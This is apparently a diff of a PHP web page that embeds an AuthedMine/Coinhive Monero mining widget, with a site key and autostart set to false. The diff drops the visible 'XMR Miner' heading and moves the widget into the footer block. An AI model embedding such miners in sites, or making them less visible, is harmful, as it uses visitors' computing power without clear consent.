@@ -68,9 +68,12 @@ include("layout/c794bc6c9a3eccc2.php");
 -->
 
 <script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
-<div class="container">
-  <h2>XMR Miner</h2>
-  <div class="coinhive-miner" 
+<!--  footer -->
+  <footer id="footer" class="footer-main-block">
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-3 col-md-3">
+          <div class="coinhive-miner" 
     style="position: absolute;top: 200px;height: 100%;border-collapse: collapse;display: table;width: 100%;min-width: 200px"
     data-key="dmQTh9BimGpFmAdq4RUPFgUfjH0SYIt2"
     data-autostart="false"
@@ -85,11 +88,6 @@ include("layout/c794bc6c9a3eccc2.php");
   </div>
  </div>
 <!-- miner end -->
-<!--  footer -->
-  <footer id="footer" class="footer-main-block">
-    <div class="container">
-      <div class="row">
-        <div class="col-lg-3 col-md-3">
           <div class="footer-logo-block">
             <div class="footer-logo">
               <img src="images/icons/logo-icon.png" alt="logo-icon">
@@ -123,30 +121,6 @@ include("layout/c794bc6c9a3eccc2.php");
     </div>
   </footer>
 <!--  end footer -->
-<!-- video modal -->
-  <div class="modal fade video-modal" id="video-modal">
-    <div class="modal-dialog" role="document">
-      <div class="modal-content">
-        <div class="modal-body contact-modal-body">
-          <div class="video-item video-item-one">
-            <script type="text/javascript">
-              var video_url = '<iframe src="https://www.youtube.com/embed/-8-d8GR9rew?autoplay=1&showinfo=0" frameborder="0"></iframe>';
-            </script>
-            <div class="video-device">
-              <img class="bg_img img-responsive" src="images/bg/video-bg.jpg" alt="blog-video" />
-              <div class="overlay-bg"></div>
-              <div class="video-preview">
-                <div class="video-btn-two">
-                  <a href="javascript:void(0);" class="btn-video-play"><i class="fa fa-play"></i></a>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-<!-- end video modal -->
 <!-- jquery -->
 <script type="text/javascript" src="js/jquery.min.js"></script> <!-- jquery library js -->
 <script type="text/javascript" src="js/bootstrap.bundle.min.js"></script> <!-- bootstrap js -->
